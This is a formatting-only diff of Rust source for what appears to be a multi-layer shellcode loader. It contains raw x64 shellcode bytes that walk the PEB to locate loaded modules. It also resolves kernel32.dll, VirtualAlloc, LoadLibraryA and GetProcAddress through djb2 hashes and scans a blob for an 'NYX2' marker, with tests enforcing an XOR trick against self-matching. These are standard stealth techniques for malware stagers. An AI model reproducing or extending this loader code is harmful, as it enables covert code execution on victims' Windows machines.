@@ -274,7 +274,8 @@ pub const LAYER2_PEB_WALK: &[u8] = &[
     0x48, 0x39, 0xE9, // cmp rcx, rbp            ; back to head?
     0x74, 0x24, // je peb_walk_failed (+0x24 → bail)
     // hash BaseDllName (UTF-16, buffer at entry+0x58, length at entry+0x58)
-    0x48, 0x83, 0xC1, 0x58, // add rcx, 0x58          ; rcx = &entry->BaseDllName (UNICODE_STRING)
+    0x48, 0x83, 0xC1,
+    0x58, // add rcx, 0x58          ; rcx = &entry->BaseDllName (UNICODE_STRING)
     0x48, 0x8B, 0x71, 0x08, // mov rsi, [rcx+0x08]    ; rsi = BaseDllName.Buffer
     0x0F, 0xB7, 0x41, 0x00, // movzx eax, word [rcx]  ; eax = BaseDllName.Length (bytes)
     0xD1, 0xE8, // shr eax, 1            ; eax = char count
@@ -322,12 +323,7 @@ pub fn find_magic_offset(blob: &[u8], scan_start: usize, bound: usize) -> Option
     let last = end - 4;
     let mut cur = scan_start;
     while cur <= last {
-        let dword = u32::from_le_bytes([
-            blob[cur],
-            blob[cur + 1],
-            blob[cur + 2],
-            blob[cur + 3],
-        ]);
+        let dword = u32::from_le_bytes([blob[cur], blob[cur + 1], blob[cur + 2], blob[cur + 3]]);
         if dword == crate::stub::NYX2_MAGIC {
             return Some(cur);
         }
@@ -347,9 +343,21 @@ mod tests {
     /// blob ever reaches the VPS probe.
     #[test]
     fn hash_constants_match_djb2_of_names() {
-        assert_eq!(djb2(b"kernel32.dll"), HASH_KERNEL32_DLL, "kernel32.dll hash");
-        assert_eq!(djb2(b"VirtualAlloc"), HASH_VIRTUAL_ALLOC, "VirtualAlloc hash");
-        assert_eq!(djb2(b"LoadLibraryA"), HASH_LOAD_LIBRARY_A, "LoadLibraryA hash");
+        assert_eq!(
+            djb2(b"kernel32.dll"),
+            HASH_KERNEL32_DLL,
+            "kernel32.dll hash"
+        );
+        assert_eq!(
+            djb2(b"VirtualAlloc"),
+            HASH_VIRTUAL_ALLOC,
+            "VirtualAlloc hash"
+        );
+        assert_eq!(
+            djb2(b"LoadLibraryA"),
+            HASH_LOAD_LIBRARY_A,
+            "LoadLibraryA hash"
+        );
         assert_eq!(
             djb2(b"GetProcAddress"),
             HASH_GET_PROC_ADDRESS,
@@ -432,7 +440,8 @@ mod tests {
         // Scan every 4-byte window of LAYER1_BOOTSTRAP for the magic.
         for w in LAYER1_BOOTSTRAP.windows(4) {
             assert_ne!(
-                w, &magic_bytes[..],
+                w,
+                &magic_bytes[..],
                 "LAYER1_BOOTSTRAP contains the NYX2 magic as a contiguous 4-byte window at \
                  offset {}, which would make the scanner self-match; use the XOR-recover \
                  idiom (mov eax, obf; xor eax, key) instead",
